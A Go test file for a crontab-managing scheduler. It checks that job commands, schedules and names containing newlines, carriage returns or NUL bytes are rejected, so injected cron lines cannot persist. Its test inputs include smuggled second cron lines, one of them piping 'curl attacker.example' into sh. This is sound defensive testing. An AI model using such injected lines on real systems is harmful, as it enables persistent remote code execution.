package scheduler

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// C2: job data must never produce a crontab line containing a newline.

// fakeCrontab puts a stand-in `crontab` binary on PATH backed by a file and
// returns that file's path. Seed is the initial crontab ("" = none).
func fakeCrontab(t *testing.T, seed string) string {
	t.Helper()
	bin := t.TempDir()
	store := filepath.Join(t.TempDir(), "crontab.txt")
	if seed != "" {
		if err := os.WriteFile(store, []byte(seed), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	script := `#!/bin/sh
case "$1" in
-l) if [ -s "$FAKE_CRONTAB_FILE" ]; then cat "$FAKE_CRONTAB_FILE"; else echo "no crontab for tester" >&2; exit 1; fi ;;
-) cat > "$FAKE_CRONTAB_FILE" ;;
*) exit 2 ;;
esac
`
	if err := os.WriteFile(filepath.Join(bin, "crontab"), []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("PATH", bin+string(os.PathListSeparator)+os.Getenv("PATH"))
	t.Setenv("FAKE_CRONTAB_FILE", store)
	return store
}

func readFakeCrontab(t *testing.T, store string) string {
	t.Helper()
	b, err := os.ReadFile(store)
	if err != nil && !os.IsNotExist(err) {
		t.Fatal(err)
	}
	return string(b)
}

// newLoadedScheduler returns a scheduler that may save (no Start, so no
// cron goroutines and no crontab sync).
func newLoadedScheduler(t *testing.T) *Scheduler {
	t.Helper()
	s := New(t.TempDir(), nil)
	if err := s.loadJobs(); err != nil {
		t.Fatal(err)
	}
	return s
}

const userCrontab = "# user entry\n15 3 * * * /usr/bin/true\n"

func TestAddSystemJob_RejectsControlCharacters(t *testing.T) {
	withDaemonZone(t, time.UTC)
	cases := map[string]*Job{
		"LF in command":   {ID: "inj1", Type: JobTypeSystem, Schedule: "0 2 * * *", Command: "true\n* * * * * curl attacker.example | sh"},
		"CR in command":   {ID: "inj2", Type: JobTypeSystem, Schedule: "0 2 * * *", Command: "true\r* * * * * payload"},
		"CRLF in command": {ID: "inj3", Type: JobTypeSystem, Schedule: "0 2 * * *", Command: "true\r\n* * * * * payload"},
		"NUL in command":  {ID: "inj4", Type: JobTypeSystem, Schedule: "0 2 * * *", Command: "true\x00payload"},
		"LF in schedule":  {ID: "inj5", Type: JobTypeSystem, Schedule: "0 2 * *\n*", Command: "/usr/bin/true"},
		"CR in schedule":  {ID: "inj6", Type: JobTypeSystem, Schedule: "0 2 * * *\r", Command: "/usr/bin/true"},
		"LF in name":      {ID: "inj7", Type: JobTypeSystem, Schedule: "0 2 * * *", Command: "/usr/bin/true", Name: "a\nb"},
	}
	for name, job := range cases {
		t.Run(name, func(t *testing.T) {
			store := fakeCrontab(t, userCrontab)
			s := newLoadedScheduler(t)
			if err := s.AddJob(job); err == nil {
				t.Fatalf("AddJob accepted %q", job.Command+" / "+job.Schedule)
			}
			if got := readFakeCrontab(t, store); got != userCrontab {
				t.Fatalf("crontab modified:\n%s", got)
			}
			if _, err := s.GetJob(job.ID); err == nil {
				t.Fatal("rejected job was registered")
			}
		})
	}
}

func TestSystemJob_CancelRemovesEverythingItCreated(t *testing.T) {
	withDaemonZone(t, time.UTC)
	store := fakeCrontab(t, userCrontab)
	s := newLoadedScheduler(t)

	job := &Job{ID: "bk1", Type: JobTypeSystem, Schedule: "0 2 * * *", Command: "/usr/local/bin/backup.sh", Enabled: true}
	if err := s.AddJob(job); err != nil {
		t.Fatal(err)
	}
	got := readFakeCrontab(t, store)
	if !strings.HasPrefix(got, userCrontab) || strings.Count(got, "\n") != strings.Count(userCrontab, "\n")+1 {
		t.Fatalf("expected the user crontab plus one managed line, got:\n%s", got)
	}
	if !strings.Contains(got, "/usr/local/bin/backup.sh # CONDUIT-MANAGED CONDUIT-JOB-ID:bk1") {
		t.Fatalf("managed line missing:\n%s", got)
	}

	if err := s.RemoveJob("bk1"); err != nil {
		t.Fatal(err)
	}
	if got := readFakeCrontab(t, store); got != userCrontab {
		t.Fatalf("cancel left lines behind:\n%s", got)
	}

	// An injected second line must never outlive cancel: either the job is
	// refused, or removing it restores the original crontab.
	inj := &Job{ID: "bk2", Type: JobTypeSystem, Schedule: "0 2 * * *", Command: "true\n* * * * * /tmp/payload", Enabled: true}
	if err := s.AddJob(inj); err == nil {
		_ = s.RemoveJob("bk2")
	}
	if got := readFakeCrontab(t, store); got != userCrontab {
		t.Fatalf("injected job left lines behind:\n%s", got)
	}
}

func TestCrontabLine_RefusesMultiLineOutput(t *testing.T) {
	for _, job := range []*Job{
		{ID: "a", Schedule: "0 2 * * *", Command: "true\n* * * * * payload"},
		{ID: "b", Schedule: "0 2 * * *", Command: "true\rpayload"},
		{ID: "c\nx", Schedule: "0 2 * * *", Command: "true"},
		{ID: "d", Schedule: "0 2 * *\n*", Command: "true"},
		{ID: "e", Schedule: "0 2 * * *", Command: "true\x00"},
	} {
		if line, err := crontabLineIn(job, CrontabMarker, time.UTC, tz74Ref); err == nil {
			t.Errorf("job %q: rendered %q, want error", job.ID, line)
		}
	}
	if _, err := crontabLineIn(&Job{ID: "ok", Schedule: "0 2 * * *", Command: "/usr/bin/true"}, CrontabMarker, time.UTC, tz74Ref); err != nil {
		t.Fatalf("clean job: %v", err)
	}
}

func TestWriteSystemCrontab_RefusesEmbeddedNewline(t *testing.T) {
	store := fakeCrontab(t, userCrontab)
	s := newLoadedScheduler(t)
	if err := s.writeSystemCrontab([]string{"# ok", "0 2 * * * true\n* * * * * payload"}); err == nil {
		t.Fatal("writeSystemCrontab accepted an entry with a newline")
	}
	if got := readFakeCrontab(t, store); got != userCrontab {
		t.Fatalf("crontab modified:\n%s", got)
	}
}

func TestAddGoJob_ControlCharacters(t *testing.T) {
	s := newLoadedScheduler(t)
	if err := s.AddJob(&Job{ID: "g1", Type: JobTypeGo, Schedule: "0 9 * *\n*", Command: "Check email"}); err == nil {
		t.Fatal("go job with a newline in its schedule was accepted")
	}
	if err := s.AddJob(&Job{ID: "g2", Type: JobTypeGo, Schedule: "0 9 * * *", Command: "a\x00b"}); err == nil {
		t.Fatal("go job with NUL in its command was accepted")
	}
	// Go-job commands are AI prompts kept in cron_jobs.json: multi-line is fine.
	if err := s.AddJob(&Job{ID: "g3", Type: JobTypeGo, Schedule: "0 9 * * *", Command: "Checklist:\n- email\n- calendar"}); err != nil {
		t.Fatalf("multi-line go prompt rejected: %v", err)
	}
}
